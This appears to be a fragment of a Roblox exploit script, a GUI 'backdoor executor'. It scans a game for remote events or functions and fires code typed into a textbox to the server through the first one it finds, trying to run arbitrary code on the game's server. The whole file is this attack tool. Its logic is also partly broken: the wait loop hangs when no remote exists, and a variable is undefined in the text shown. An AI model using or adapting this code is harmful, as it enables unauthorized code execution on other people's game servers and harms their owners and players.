local executeBtn = G2L["TextButton_f"]
local clearBtn = G2L["TextButton2_7"]
local closeBtn = G2L["TextButton3_a"]
local remoteLabel = G2L["TextLabel_12"]

-- Variables for scanning
local FinishedFound = false
local remoteEvent, remoteFunction

-- Remote scanner function
local function findRemote()
    local function isBackdoorRemote(obj)
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            if obj.Name ~= "Kick" and obj.Name ~= "Ban" then
                if obj:IsDescendantOf(game) and not obj:IsDescendantOf(game:GetService("Players")) then
                    return true
                end
            end
        end
        return false
    end

    for _, obj in ipairs(game:GetDescendants()) do
        if isBackdoorRemote(obj) then
            if obj:IsA("RemoteEvent") then
                remoteEvent = obj
            elseif obj:IsA("RemoteFunction") then
                remoteFunction = obj
            end
            FinishedFound = true
            break
        end
    end
end

-- Execute button logic
executeBtn.MouseButton1Click:Connect(function()
    task.spawn(findRemote)
    remoteLabel.Text = "Scanning..."
    executeBtn.Text = "Checking..."
    executeBtn.AutoButtonColor = false

    repeat task.wait() until FinishedFound or remoteEvent or remoteFunction
    repeat task.wait() until FinishedFound

    if remoteEvent or remoteFunction then
        local foundName = (remoteEvent and remoteEvent.Name) or (remoteFunction and remoteFunction.Name) or "Unknown"
        remoteLabel.Text = "Remote: " .. foundName
        executeBtn.Text = "Execute"
        executeBtn.AutoButtonColor = true

        local code = textbox.Text
        if remoteEvent then
            remoteEvent:FireServer(code)
        elseif remoteFunction then
            remoteFunction:InvokeServer(code)
        end
    else
        remoteLabel.Text = "Remote: Not Found"
        executeBtn.Text = "Execute"
        executeBtn.AutoButtonColor = true
    end
end)

